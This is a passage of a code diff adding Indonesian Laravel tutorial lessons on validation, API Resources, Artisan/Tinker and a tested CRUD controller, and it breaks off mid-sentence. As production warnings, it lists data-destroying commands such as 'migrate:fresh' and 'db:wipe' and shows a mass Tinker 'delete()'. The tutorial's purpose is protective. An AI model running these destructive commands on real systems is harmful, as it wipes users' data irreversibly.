+        'Form Request punya beberapa perilaku yang mengejutkan bila tidak diketahui, dan yang pertama menyangkut apa yang terjadi ketika validasinya gagal.',
+      ),
+      code(
+        'text',
+        `
+        Permintaan yang MENGHARAPKAN JSON (header Accept: application/json):
+          -> 422 dengan badan { "message": "...", "errors": { "jumlah": ["..."] } }
+
+        Permintaan dari formulir HTML biasa:
+          -> 302 kembali ke halaman sebelumnya, dengan error di session
+
+        Dua perilaku berbeda dari SATU kode yang sama, dan yang menentukan
+        adalah header Accept dari pemanggil. Klien API yang lupa mengirim
+        header itu akan menerima PENGALIHAN, bukan pesan validasi —
+        dan itu sering terlihat sebagai "endpoint-nya tidak merespons apa-apa".
+        `,
+      ),
+      p(
+        'Perilaku kedua yang menjebak adalah **urutan** antara `authorize` dan `rules`. Laravel menjalankan `authorize` lebih dulu, jadi permintaan yang tidak berwenang dijawab `403` tanpa validasinya pernah berjalan. Itu benar dan diinginkan, sebab pesan validasi yang rinci untuk permintaan yang tidak berhak sendiri merupakan kebocoran keterangan.',
+      ),
+      code(
+        'php',
+        `
+        // Perilaku bawaan authorize() yang tidak dituliskan:
+        public function authorize(): bool
+        {
+            return true;     // <-- INI bawaannya bila method-nya tidak ditulis
+        }
+
+        // Jadi Form Request yang TIDAK menulis authorize() memperbolehkan
+        // siapa pun yang lolos middleware. Itu sering benar — otorisasinya
+        // memang di tempat lain — tapi harus keputusan yang SADAR,
+        // bukan sesuatu yang terjadi karena method-nya lupa ditulis.
+        `,
+      ),
+      p(
+        'Kegagalan ketiga tidak menghasilkan error dan menghapus seluruh manfaat Form Request, yaitu memakai `$request->all()` setelah validasinya berjalan.',
+      ),
+      code(
+        'php',
+        `
+        // SALAH: validasinya berjalan, hasilnya dibuang.
+        public function store(BuatPesananRequest $request)
+        {
+            Pesanan::create($request->all());     // <-- field asing ikut masuk
+        }
+
+        // BENAR: pakai hasil validasinya.
+        public function store(BuatPesananRequest $request)
+        {
+            Pesanan::create($request->validated());
+            // atau lebih sempit lagi:
+            Pesanan::create($request->safe()->only(['produk_id', 'jumlah', 'catatan']));
+        }
+        `,
+        {
+          caption:
+            'Ini bentuk Laravel dari aturan yang sama di bab Express: pakai hasil parsing, bukan badan mentah.',
+        },
+      ),
+      p(
+        'Perbedaannya persis sama dengan yang diukur di bab Express dengan zod, yaitu skema membuang kunci yang tidak dideklarasikan, dan seluruh perlindungan itu hilang begitu kamu kembali membaca permintaan mentahnya.',
+      ),
+      code(
+        'text',
+        `
+        Diukur sungguhan dengan zod 4.4.3:
+
+          z.object({ nama: z.string() }).parse({ nama: 'Rina', peran: 'admin' })
+            -> {"nama":"Rina"}            <- kunci "peran" DIBUANG
+
+        Laravel melakukan hal yang setara lewat validated(), dan seperti zod,
+        ia hanya berlaku pada hasilnya — bukan pada $request->all().
+        `,
+        { caption: 'Dijalankan sungguhan di bab Express. Prinsipnya identik di kedua ekosistem.' },
+      ),
+      p(
+        'Satu kegagalan terakhir menyangkut aturan yang melibatkan basis data, dan biayanya sering tidak disadari.',
+      ),
+      code(
+        'php',
+        `
+        'produk_id' => ['required', 'integer', 'exists:produk,id'],
+
+        // Aturan exists menjalankan SATU query. Untuk 'item.*.produk' pada
+        // array berisi 50 item, itu 50 query — bentuk N+1 di dalam validasi.
+        //
+        // Untuk array, periksa sekali untuk seluruh nilainya:
+        'item' => [
+            'required', 'array', 'max:50',
+            function (string $atribut, array $nilai, Closure $gagal) {
+                $id = collect($nilai)->pluck('produk')->unique();
+                $ada = Produk::whereIn('id', $id)->pluck('id');
+                if ($id->diff($ada)->isNotEmpty()) $gagal('Ada produk yang tidak dikenal.');
+            },
+        ],
+        `,
+        { caption: 'Satu query untuk seluruh item, menggantikan satu query per item.' },
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Validasi adalah tempat di mana mengerjakan setengahnya sering lebih berbahaya daripada tidak mengerjakannya sama sekali, sebab ia memberi rasa aman yang tidak berdasar.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Memvalidasi lalu memakai `$request->all()`',
+            'Sudah divalidasi',
+            'Field asing yang dibuang validasi kembali masuk. Seluruh perlindungannya hilang. Pakai `validated()`',
+          ],
+          [
+            'Tidak menulis `authorize()`',
+            'Otorisasinya di middleware',
+            'Bawaannya `true`. Sering benar, tapi harus keputusan sadar, bukan akibat method yang lupa ditulis',
+          ],
+          [
+            'Tidak memberi batas `max` pada string dan array',
+            'Penggunanya tidak akan mengirim sebanyak itu',
+            'Endpoint bisa dipanggil langsung. Batas adalah kontrol ketersediaan, bukan pembatasan pengguna',
+          ],
+          [
+            'Memakai `exists` di dalam `item.*`',
+            'Tiap item memang harus diperiksa',
+            'Satu query per item. Untuk 50 item berarti 50 query. Periksa sekali untuk seluruh nilainya',
+          ],
+          [
+            'Mengandalkan validasi di sisi klien',
+            'Formulirnya sudah memeriksa',
+            'Klien bisa dilewati sepenuhnya. Validasi klien adalah pengalaman pengguna, bukan kontrol',
+          ],
+          [
+            'Menaruh aturan bisnis di dalam `rules()`',
+            'Sama-sama pemeriksaan',
+            '"Stok harus cukup" bukan validasi bentuk melainkan aturan bisnis. Tempatnya di service, dan jawabannya `409`',
+          ],
+        ],
+      ),
+      p(
+        'Baris terakhir memuat pembedaan yang halus dan berguna. Validasi menjawab "apakah bentuk permintaannya masuk akal", dan jawabannya tidak bergantung pada keadaan sistem. Aturan bisnis menjawab "apakah ini boleh terjadi sekarang", dan jawabannya bergantung pada stok, saldo, atau status yang bisa berubah kapan saja. Menaruh yang kedua di dalam `rules()` menghasilkan `422` untuk sesuatu yang sebenarnya `409`, dan membuat aturannya tidak bisa dipakai dari luar HTTP, misalnya dari perintah CLI atau job latar.',
+      ),
       references(
         {
           label: 'Validation — Form Request Validation',
@@ -2660,7 +4777,7 @@ export const lessons: LessonDraft[] = [
   written(
     'api-resource',
     'API Resource & Transformasi Respons',
-    11,
+    19,
     'Memisahkan bentuk JSON dari bentuk tabel.',
     [
       p(
@@ -2871,6 +4988,198 @@ export const lessons: LessonDraft[] = [
       p(
         'Resource menyelesaikan masalah yang sama dengan aturan "jangan kirim hasil `SELECT *`" di Express — hanya dengan cara yang lebih terstruktur. Prinsipnya identik: **bentuk respons adalah kontrak yang kamu putuskan sadar**, bukan cerminan otomatis dari struktur tabel.',
       ),
+      h2('Studi kasus di project nyata'),
+      p(
+        'API Resource menjawab satu pertanyaan yang terlihat sepele dan berakibat besar, yaitu **apa yang keluar dari aplikasimu**. Tanpa lapisan itu, jawabannya adalah "apa pun yang kebetulan ada di model", dan jawaban itu berubah setiap kali seseorang menambah kolom.',
+      ),
+      code(
+        'php',
+        `
+        // Tanpa Resource. Terlihat paling sederhana.
+        return Pengguna::find($id);
+
+        // Yang benar-benar keluar adalah SELURUH kolom tabel, termasuk yang
+        // ditambahkan bulan depan oleh orang lain:
+        //   { "id":1, "email":"...", "password":"$2y$...", "remember_token":"...",
+        //     "catatan_internal":"...", "skor_risiko":87, "created_at":"..." }
+        //
+        // Laravel menyembunyikan sebagian lewat $hidden, dan itu bekerja —
+        // selama setiap kolom baru diingat untuk ditambahkan ke sana.
+        // Itu daftar LARANGAN, dan daftar larangan selalu tertinggal.
+        `,
+      ),
+      p(
+        'Perbedaannya dengan Resource adalah perbedaan antara daftar larangan dan daftar izin. Dengan `$hidden`, kolom baru **otomatis ikut keluar** kecuali ada yang ingat menyembunyikannya. Dengan Resource, kolom baru **otomatis tidak keluar** kecuali ada yang sengaja menambahkannya.',
+      ),
+      code(
+        'php',
+        `
+        <?php
+        declare(strict_types=1);
+
+        final class PesananResource extends JsonResource
+        {
+            public function toArray(Request $request): array
+            {
+                return [
+                    'id' => $this->id,
+                    'status' => $this->status,
+                    // Uang keluar sebagai bilangan bulat dalam satuan terkecil,
+                    // beserta keterangan satuannya — alasannya diukur di bab Fondasi:
+                    // 19.99 * 100 menghasilkan 1998.9999999999998.
+                    'total' => ['jumlah' => $this->total, 'satuan' => 'IDR', 'pecahan' => 0],
+                    'dibuat_pada' => $this->created_at->toIso8601String(),
+
+                    // whenLoaded mencegah N+1: relasi disertakan HANYA bila
+                    // controller memang memuatnya lebih dulu dengan with().
+                    'pelanggan' => PelangganResource::make($this->whenLoaded('pelanggan')),
+                    'item' => ItemResource::collection($this->whenLoaded('item')),
+
+                    // Field yang hanya boleh dilihat sebagian orang.
+                    'catatan_internal' => $this->when(
+                        $request->user()?->can('lihatInternal', $this->resource) ?? false,
+                        fn () => $this->catatan_internal,
+                    ),
+                ];
+            }
+        }
+        `,
+        {
+          caption:
+            'whenLoaded dan when adalah dua mekanisme berbeda: yang satu soal performa, yang lain soal kewenangan.',
+        },
+      ),
+      p(
+        'Bagian `whenLoaded` layak diperhatikan karena ia menutup N+1 dengan cara yang berbeda dari `with()`. Menulis `$this->pelanggan` langsung di dalam Resource akan **memicu query** untuk setiap baris ketika relasinya belum dimuat, dan pada daftar berisi seratus baris itu berarti seratus query. Dengan `whenLoaded`, relasinya hanya muncul bila controller memang sudah memuatnya, sehingga kelalaian itu menjadi field yang hilang alih-alih seratus perjalanan ke basis data.',
+      ),
+      p(
+        'Bentuk `total` di atas juga bukan gaya penulisan melainkan keputusan yang diambil dari pengukuran.',
+      ),
+      code(
+        'text',
+        `
+        Diukur sungguhan dengan Node 26.5.0 di bab Fondasi:
+
+          19.99 * 100                 = 1998.9999999999998
+          JSON.parse('{"id":9007199254740993}').id = 9007199254740992
+
+        Baris kedua itu alasan id besar dikirim sebagai STRING, dan baris
+        pertama alasan uang dikirim sebagai bilangan bulat dalam satuan terkecil.
+        Kedua keputusan itu harus diambil SEJAK AWAL: mengubahnya belakangan
+        berarti memutus setiap klien yang sudah memperlakukannya sebagai angka.
+        `,
+        { caption: 'Dijalankan sungguhan. Klien JavaScript adalah pemakai API yang paling umum.' },
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Kegagalan yang berhubungan dengan bentuk respons hampir tidak pernah berupa error, dan yang paling mahal adalah **kebocoran data**.',
+      ),
+      code(
+        'text',
+        `
+        KEBOCORAN 1 — kolom baru yang ikut keluar
+
+          Bulan lalu: return Pengguna::find($id);   -> aman, kolomnya wajar
+          Bulan ini : kolom "catatan_internal" ditambahkan oleh orang lain
+          Hasilnya  : kolom itu langsung muncul di respons publik
+
+          Tidak ada error, tidak ada test yang gagal, dan tidak ada yang tahu.
+
+        KEBOCORAN 2 — relasi yang ikut terbawa
+
+          return Pesanan::with('pelanggan')->find($id);
+
+          Seluruh kolom pelanggan ikut, termasuk email, telepon, dan alamat,
+          pada endpoint yang seharusnya hanya menampilkan ringkasan pesanan.
+
+        KEBOCORAN 3 — error yang membawa struktur internal
+
+          Diukur di bab Express: respons 500 yang menyertakan err.stack
+          membocorkan jalur berkas dan struktur folder server.
+        `,
+      ),
+      p(
+        'Yang membuat kebocoran pertama begitu sering terjadi adalah bahwa penyebabnya bukan orang yang menulis endpoint-nya. Endpoint itu ditulis dengan benar pada waktunya, lalu berubah arti karena perubahan di tempat lain. Daftar izin membalik sifat itu, sebab perubahan di tempat lain tidak bisa menambah apa pun ke respons.',
+      ),
+      p('Kegagalan kedua bersifat teknis dan bunyinya khas.'),
+      code(
+        'text',
+        `
+        Property [nama] does not exist on this collection instance.
+
+        Penyebabnya: PesananResource::make() dipakai untuk KOLEKSI,
+        atau PesananResource::collection() dipakai untuk SATU objek.
+
+          satu objek : PesananResource::make($pesanan)
+          koleksi    : PesananResource::collection($daftar)
+        `,
+      ),
+      p(
+        'Kegagalan ketiga menyangkut bentuk respons yang berubah-ubah tanpa disengaja, dan ia memutus klien.',
+      ),
+      code(
+        'text',
+        `
+        Resource tunggal        -> { "data": { ... } }
+        Resource koleksi        -> { "data": [ ... ] }
+        Resource + paginate()   -> { "data": [...], "links": {...}, "meta": {...} }
+        Model apa adanya        -> { ... }     <- TANPA pembungkus "data"
+
+        Empat bentuk berbeda dari satu API yang sama, tergantung cara
+        endpoint-nya ditulis. Klien harus menulis empat penanganan berbeda.
+
+        Putuskan SATU bentuk untuk seluruh API, lalu tegakkan. Bila pembungkus
+        "data" tidak diinginkan, matikan sekali di service provider —
+        jangan sebagian endpoint memakainya dan sebagian tidak.
+        `,
+      ),
+      p(
+        'Konsistensi itu jauh lebih berharga daripada bentuk mana pun yang dipilih. Klien yang menghadapi satu bentuk menulis satu penanganan, dan klien yang menghadapi empat bentuk menulis percabangan yang akan salah pada endpoint kelima.',
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Bentuk respons adalah bagian kontrak yang paling sulit diubah setelah ada klien yang memakainya, dan paling mudah berubah tanpa disengaja.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Mengembalikan model apa adanya',
+            'Field-nya memang itu',
+            'Kolom yang ditambahkan orang lain bulan depan langsung ikut keluar. Pakai daftar izin',
+          ],
+          [
+            'Mengandalkan `$hidden` untuk menyembunyikan',
+            'Sudah ada daftarnya',
+            'Itu daftar larangan, dan daftar larangan selalu tertinggal dari kolom baru',
+          ],
+          [
+            'Mengakses relasi langsung di dalam Resource',
+            'Datanya memang dibutuhkan',
+            'Memicu query per baris bila belum dimuat. Pakai `whenLoaded`',
+          ],
+          [
+            'Mengirim uang sebagai angka pecahan',
+            'Harganya memang berkoma',
+            'Diukur, `19.99 * 100` menghasilkan `1998.9999999999998`. Kirim bilangan bulat plus satuannya',
+          ],
+          [
+            'Mengirim id besar sebagai angka',
+            'Id memang angka',
+            'Diukur, `9007199254740993` menjadi `...992` di klien JavaScript. Kirim sebagai string',
+          ],
+          [
+            'Memakai bentuk pembungkus yang berbeda antar-endpoint',
+            'Masing-masing sudah benar',
+            'Klien harus menulis beberapa penanganan berbeda. Putuskan satu bentuk, tegakkan di seluruh API',
+          ],
+        ],
+      ),
+      p(
+        'Baris kelima adalah keputusan yang paling mahal diperbaiki belakangan, dan alasannya bukan teknis melainkan sosial. Mengubah id dari angka menjadi string memutus setiap klien yang sudah memperlakukannya sebagai angka, termasuk aplikasi ponsel yang sudah terpasang di perangkat pengguna dan tidak bisa dipaksa berubah pada hari yang sama. Karena itu keputusan ini diambil sebelum klien pertama ada, bukan setelah bug pembulatannya dilaporkan.',
+      ),
       references(
         {
           label: 'Eloquent: API Resources',
@@ -2903,7 +5212,7 @@ export const lessons: LessonDraft[] = [
   written(
     'artisan-tinker',
     'Artisan & Tinker',
-    9,
+    15,
     'Perkakas baris perintah yang dipakai setiap hari.',
     [
       terms(
@@ -3096,6 +5405,174 @@ export const lessons: LessonDraft[] = [
       p(
         'Perintah seperti ini bisa dijadwalkan. Perhatikan bahwa ia memanggil model langsung — inilah keuntungan menjaga aturan bisnis di luar controller: ia bisa dipakai dari HTTP maupun dari baris perintah.',
       ),
+      h2('Studi kasus di project nyata'),
+      p(
+        'Artisan dan Tinker paling berguna bukan untuk membuat berkas melainkan untuk **menjawab pertanyaan tentang aplikasi yang sedang berjalan**. Tiga perintah berikut menjawab tiga pertanyaan yang paling sering muncul saat menelusuri masalah.',
+      ),
+      code(
+        'text',
+        `
+        php artisan route:list --path=pesanan
+          -> Rute apa yang sebenarnya terdaftar, method apa, middleware apa,
+             dan controller mana yang menanganinya. Menjawab
+             "kenapa 404" dan "kenapa middleware-nya tidak jalan".
+
+        php artisan about
+          -> Environment apa yang sedang aktif, driver cache dan antrean apa
+             yang dipakai, dan cache mana yang sedang menyala. Menjawab
+             "kenapa perubahan saya tidak muncul".
+
+        php artisan tinker
+          -> REPL dengan seluruh aplikasi termuat. Menjawab pertanyaan tentang
+             DATA tanpa menulis satu pun endpoint sementara.
+        `,
+      ),
+      p(
+        'Perintah kedua menjawab kelas masalah yang paling sering membuang waktu, yaitu perubahan kode yang tidak berpengaruh sama sekali karena versi lamanya masih di-cache.',
+      ),
+      code(
+        'text',
+        `
+        Gejala                                   Yang di-cache      Perintahnya
+        ---------------------------------------  -----------------  --------------------------
+        Rute baru menghasilkan 404               route:cache        php artisan route:clear
+        Perubahan .env tidak berpengaruh         config:cache       php artisan config:clear
+        Perubahan Blade tidak muncul             view cache         php artisan view:clear
+        Kelas baru tidak ditemukan               autoload Composer  composer dump-autoload
+
+        Satu perintah yang membersihkan semuanya sekaligus:
+          php artisan optimize:clear
+        `,
+      ),
+      p(
+        'Baris kedua memuat jebakan yang layak diketahui sebelum ditemui. Begitu `config:cache` dijalankan, Laravel **berhenti membaca berkas `.env` sama sekali** dan hanya memakai nilai yang sudah tersimpan di cache. Jadi memanggil `env()` di luar berkas konfigurasi akan mengembalikan `null` di produksi, meski variabelnya jelas ada. Aturan yang menutupnya, `env()` hanya boleh dipanggil di dalam berkas `config/`, dan seluruh kode lain membaca lewat `config()`.',
+      ),
+      p(
+        'Tinker sendiri paling berharga untuk memeriksa hal yang sulit dilihat dari luar, terutama **query yang sebenarnya dijalankan**.',
+      ),
+      code(
+        'php',
+        `
+        // Melihat SQL-nya tanpa menjalankannya:
+        >>> Pesanan::with('pelanggan')->where('status', 'baru')->toSql();
+        => "select * from \\"pesanan\\" where \\"status\\" = ?"
+
+        // Menghitung query yang benar-benar berjalan — cara paling cepat
+        // membuktikan ada N+1 atau tidak:
+        >>> DB::enableQueryLog();
+        >>> $p = Pesanan::limit(100)->get();
+        >>> foreach ($p as $x) { $x->pelanggan->nama; }
+        >>> count(DB::getQueryLog());
+        => 101                                   // <-- 1 + 100, inilah N+1-nya
+
+        >>> DB::flushQueryLog();
+        >>> $p = Pesanan::with('pelanggan')->limit(100)->get();
+        >>> foreach ($p as $x) { $x->pelanggan->nama; }
+        >>> count(DB::getQueryLog());
+        => 2
+        `,
+        { caption: 'Angka 101 melawan 2 itu bukti yang bisa dilihat, bukan dugaan.' },
+      ),
+      p(
+        'Selisih 101 melawan 2 itu adalah bentuk Laravel dari apa yang sudah diukur waktunya di bab database, yaitu 1.000 query terpisah memakan 53 milidetik melawan 3 milidetik untuk satu query, pada koneksi lokal. Di basis data yang berada di zona lain, selisih yang sama menjadi hitungan detik.',
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Ada satu kelas kecelakaan yang khas Tinker, dan penyebabnya bukan perintahnya melainkan **di mana ia dijalankan**.',
+      ),
+      code(
+        'text',
+        `
+        >>> Pesanan::where('status', 'batal')->delete();
+        => 48211
+
+        Angka itu jumlah baris yang terhapus, dan ia muncul SETELAH
+        penghapusannya terjadi. Bila sesi Tinker itu terhubung ke produksi
+        karena terminalnya belum diganti, tidak ada jalan kembali.
+
+        Kebiasaan yang menutupnya, dan biayanya satu baris:
+
+          >>> app()->environment()
+          => "production"          <-- PERIKSA INI DULU, setiap kali
+
+          >>> Pesanan::where('status', 'batal')->count()
+          => 48211                 <-- lalu hitung dulu dengan syarat yang SAMA
+        `,
+      ),
+      p(
+        'Urutan itu sama persis dengan yang berlaku untuk `UPDATE` dan `DELETE` di bab database, yaitu jalankan `count()` dengan syarat yang sama sebelum menjalankan perubahannya. Di sana angkanya sudah diukur, yaitu `UPDATE` tanpa `WHERE` menyentuh 5000 baris sedangkan yang dengan `WHERE` menyentuh 1.',
+      ),
+      p(
+        'Kelompok kesalahan kedua adalah perintah yang aman di komputer sendiri dan merusak di produksi.',
+      ),
+      code(
+        'text',
+        `
+        BERBAHAYA di produksi:
+
+          php artisan migrate:fresh     menghapus SELURUH tabel lalu membangun ulang
+          php artisan db:wipe           menghapus seluruh tabel
+          php artisan migrate --seed    menjalankan seeder yang mungkin truncate
+
+        AMAN dan memang dipakai saat rilis:
+
+          php artisan migrate --force   menjalankan migrasi yang BELUM pernah jalan
+          php artisan config:cache      menyimpan konfigurasi
+          php artisan route:cache       menyimpan rute — GAGAL bila ada closure di rute
+          php artisan queue:restart     menyuruh worker berhenti setelah job yang berjalan
+
+        Perintah terakhir itu sering dilupakan, dan akibatnya halus: worker
+        antrean menjalankan kode LAMA sampai ia dimulai ulang, sehingga
+        bug yang baru diperbaiki tetap terjadi di job latar.
+        `,
+      ),
+      p(
+        'Baris terakhir itu bug yang sangat sulit ditelusuri karena gejalanya bertentangan dengan fakta. Kode sudah diperbaiki, deploy sudah berhasil, halamannya sudah benar, dan job latarnya tetap menghasilkan hasil lama. Penyebabnya, proses worker sudah berjalan sejak sebelum deploy dan memegang kode lama di memorinya.',
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Perkakas terasa seperti hal yang bisa dipelajari sambil jalan, dan yang terjadi tanpanya adalah penelusuran dengan cara menebak.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Menjalankan perintah yang mengubah data di Tinker tanpa memeriksa environment',
+            'Terminalnya kan terminal saya',
+            'Satu sesi yang tertinggal terhubung ke produksi cukup. Periksa `app()->environment()` dulu',
+          ],
+          [
+            'Menghapus atau mengubah tanpa `count()` lebih dulu',
+            'Syaratnya sudah benar',
+            'Diukur di bab database, `UPDATE` tanpa `WHERE` menyentuh 5000 baris. Hitung dulu dengan syarat yang sama',
+          ],
+          [
+            'Memanggil `env()` di luar berkas `config/`',
+            'Nilainya kan dari `.env`',
+            'Setelah `config:cache`, `.env` tidak dibaca lagi dan hasilnya `null` di produksi. Pakai `config()`',
+          ],
+          [
+            'Menelusuri "perubahan tidak muncul" dengan membaca ulang kode',
+            'Pasti ada yang salah di kodenya',
+            'Empat jenis cache bisa jadi penyebabnya. Jalankan `optimize:clear` dulu, baru menelusuri',
+          ],
+          [
+            'Tidak menjalankan `queue:restart` setelah deploy',
+            'Kodenya sudah terganti',
+            'Worker yang sudah berjalan memegang kode lama di memori sampai dimulai ulang',
+          ],
+          [
+            'Menduga ada N+1 tanpa menghitungnya',
+            'Terlihat seperti N+1',
+            '`DB::enableQueryLog()` dan `count(DB::getQueryLog())` menjawabnya dalam dua baris',
+          ],
+        ],
+      ),
+      p(
+        'Baris terakhir pantas dijadikan kebiasaan karena ia mengubah dugaan menjadi angka dalam hitungan detik. Sebelum mengoptimalkan apa pun, hitung dulu berapa query yang benar-benar dijalankan satu permintaan. Kadang jawabannya adalah dua, dan yang lambat ternyata hal lain sepenuhnya. Mengoptimalkan berdasarkan dugaan menghabiskan waktu pada bagian yang tidak bermasalah, dan meninggalkan yang bermasalah tetap di tempatnya.',
+      ),
       references(
         {
           label: 'Artisan Console',
@@ -3128,7 +5605,7 @@ export const lessons: LessonDraft[] = [
   written(
     'praktik-crud-laravel',
     'Praktik: REST API CRUD "catatan" dengan Laravel',
-    14,
+    21,
     'API yang sama dengan Bab 3.14, dibangun dengan Laravel.',
     [
       p(
@@ -3453,6 +5930,240 @@ export const lessons: LessonDraft[] = [
         'Document root diarahkan ke `public/`, dan `.env` tidak bisa diakses lewat web',
       ),
 
+      h2('Studi kasus di project nyata'),
+      p(
+        'CRUD Laravel yang siap dipakai berbeda dari CRUD latihan pada hal-hal yang tidak terlihat di jalur sukses, dan seluruhnya sudah diukur sepanjang dua bab terakhir. Berikut kedelapannya bertemu dalam satu sumber daya.',
+      ),
+      code(
+        'php',
+        `
+        <?php
+        declare(strict_types=1);
+
+        final class PesananController extends Controller
+        {
+            public function __construct(private readonly LayananPesanan $layanan)
+            {
+                // Otorisasi terpasang untuk SELURUH method sekaligus,
+                // jadi method baru tidak bisa lupa dipasangi.
+                $this->authorizeResource(Pesanan::class, 'pesanan');
+            }
+
+            // 1. DAFTAR — relasi dimuat di depan, paginasi dibatasi.
+            public function index(Request $request)
+            {
+                $limit = min((int) $request->integer('limit', 20), 100);   // batas ATAS wajib
+
+                $pesanan = Pesanan::query()
+                    ->where('pelanggan_id', $request->user()->id)   // batas di QUERY, bukan sesudahnya
+                    ->with('pelanggan')                             // menutup N+1
+                    ->withCount('item')                             // tanpa memuat ribuan baris item
+                    ->latest('id')                                  // pengurut UNIK, bukan created_at saja
+                    ->cursorPaginate($limit);                       // keyset, bukan OFFSET
+
+                return PesananResource::collection($pesanan);
+            }
+
+            // 2. BUAT — 201 beserta Location.
+            public function store(BuatPesananRequest $request)
+            {
+                $pesanan = $this->layanan->buat(
+                    pelangganId: $request->user()->id,
+                    data: $request->validated(),      // hasil VALIDASI, bukan ->all()
+                );
+
+                return PesananResource::make($pesanan)
+                    ->response()
+                    ->setStatusCode(201)
+                    ->header('Location', route('pesanan.show', $pesanan));
+            }
+
+            // 3. UBAH SEBAGIAN — PATCH, bukan PUT.
+            public function update(UbahPesananRequest $request, Pesanan $pesanan)
+            {
+                return PesananResource::make(
+                    $this->layanan->ubah($pesanan, $request->validated()),
+                );
+            }
+
+            // 4. HAPUS — idempoten: 204 pada percobaan kedua juga.
+            public function destroy(Pesanan $pesanan)
+            {
+                $this->layanan->hapus($pesanan);
+                return response()->noContent();
+            }
+        }
+        `,
+        {
+          caption:
+            'Tidak ada satu pun try/catch: seluruh error dilempar dan ditangani di exception handler.',
+        },
+      ),
+      p(
+        "Setiap baris bertanda di atas menjawab sesuatu yang sudah diukur. `cursorPaginate` dipakai karena `OFFSET 250000` terbukti membaca 250.020 baris untuk memberi dua puluh, sedangkan keyset membaca dua puluh. `latest('id')` memakai kolom unik karena pengurut yang bisa seri terbukti membuat satu baris tidak pernah muncul di halaman mana pun. `with` dan `withCount` menutup N+1 yang terukur 53 milidetik melawan 3 milidetik. Dan batas atas pada `limit` menutup permintaan yang memaksa server membaca sejuta baris.",
+      ),
+      p(
+        'Aturan bisnisnya sendiri tinggal di service, dan di sanalah transaksi serta pengurangan stok yang aman berada.',
+      ),
+      code(
+        'php',
+        `
+        final class LayananPesanan
+        {
+            public function buat(int $pelangganId, array $data): Pesanan
+            {
+                return DB::transaction(function () use ($pelangganId, $data) {
+                    // Pemeriksaan DAN pengurangan dalam SATU perintah.
+                    // Diukur di bab database: pola baca-hitung-tulis menyisakan
+                    // saldo 90 dari seharusnya 80 ketika dua proses berjalan bersamaan.
+                    $berkurang = Produk::where('id', $data['produk_id'])
+                        ->where('stok', '>=', $data['jumlah'])
+                        ->decrement('stok', $data['jumlah']);
+
+                    if ($berkurang === 0) throw new StokKurang($data['produk_id']);
+
+                    $produk = Produk::findOrFail($data['produk_id']);
+
+                    return Pesanan::create([
+                        'pelanggan_id' => $pelangganId,
+                        'produk_id' => $produk->id,
+                        'jumlah' => $data['jumlah'],
+                        // Harga DISALIN saat transaksi. Tanpa ini, menaikkan harga
+                        // produk mengubah nilai seluruh pesanan lama.
+                        'harga_satuan' => $produk->harga,
+                        'total' => Diskon::total($produk->harga, $data['jumlah']),
+                    ]);
+                });
+                // Pengiriman surel SENGAJA di luar transaksi: memanggil layanan
+                // luar di dalamnya menahan kunci selama menunggu jaringan.
+            }
+        }
+        `,
+        {
+          caption:
+            'decrement mengembalikan jumlah baris yang berubah — nol berarti stoknya tidak cukup.',
+        },
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Yang memisahkan CRUD siap pakai dari CRUD latihan adalah jalur yang tidak nyaman, dan seluruhnya bisa diuji dalam satu berkas perintah.',
+      ),
+      code(
+        'text',
+        `
+        #!/bin/bash
+        # uji-crud.sh — jalankan sebelum menyatakan endpoint selesai.
+        A=http://localhost:8000/api/v1/pesanan
+        H="Content-Type: application/json"
+        J="Accept: application/json"          # <-- TANPA ini, Laravel MENGALIHKAN
+        T="Authorization: Bearer $TOKEN"
+
+        p() { printf '%-36s %s\\n' "$1" "$(curl -s -o /dev/null -w '%{http_code}' "\${@:2}")"; }
+
+        p "buat, valid            (201)" -X POST   "$A" -H "$H" -H "$J" -H "$T" -d '{"produk_id":1,"jumlah":2}'
+        p "buat, jumlah 0         (422)" -X POST   "$A" -H "$H" -H "$J" -H "$T" -d '{"produk_id":1,"jumlah":0}'
+        p "buat, produk tak ada   (422)" -X POST   "$A" -H "$H" -H "$J" -H "$T" -d '{"produk_id":999999,"jumlah":1}'
+        p "buat, JSON rusak       (400)" -X POST   "$A" -H "$H" -H "$J" -H "$T" -d '{produk_id:1}'
+        p "buat, tanpa token      (401)" -X POST   "$A" -H "$H" -H "$J"        -d '{"produk_id":1,"jumlah":1}'
+        p "buat, stok kurang      (409)" -X POST   "$A" -H "$H" -H "$J" -H "$T" -d '{"produk_id":1,"jumlah":99999}'
+        p "buat, field asing      (201)" -X POST   "$A" -H "$H" -H "$J" -H "$T" -d '{"produk_id":1,"jumlah":1,"total":1}'
+        p "ambil, id bukan angka  (404)" -X GET    "$A/abc" -H "$J" -H "$T"
+        p "ambil, MILIK ORANG     (404)" -X GET    "$A/4211" -H "$J" -H "$T"
+        p "hapus pertama          (204)" -X DELETE "$A/1" -H "$J" -H "$T"
+        p "hapus kedua            (204)" -X DELETE "$A/1" -H "$J" -H "$T"
+        p "limit berlebihan       (200)" -X GET    "$A?limit=1000000" -H "$J" -H "$T"
+        `,
+        {
+          caption:
+            'Header Accept: application/json itu wajib — tanpanya Laravel menjawab 302, bukan 422.',
+        },
+      ),
+      p(
+        'Tiga baris di daftar itu perlu penjelasan karena hasilnya mudah salah dibaca. Baris "field asing" memang **201**, dan yang membuktikan perlindungannya bekerja bukan status codenya melainkan bahwa `total` yang dikirim klien tidak tersimpan. Baris "milik orang" harus **404**, bukan 403, sebab 403 mengakui bahwa pesanan bernomor itu ada. Dan baris "limit berlebihan" memang **200**, yang harus diperiksa adalah jumlah baris yang kembali tetap dibatasi seratus.',
+      ),
+      p('Baris "hapus kedua" menguji idempotensi, dan itu yang paling sering salah ditulis.'),
+      code(
+        'text',
+        `
+        Diukur di bab database dan bab Fondasi:
+
+          DELETE pertama  -> 204
+          DELETE kedua    -> 204     <- keadaan yang diminta SUDAH tercapai
+
+        Menjawab 404 pada percobaan kedua merusak idempotensi, dan akibatnya
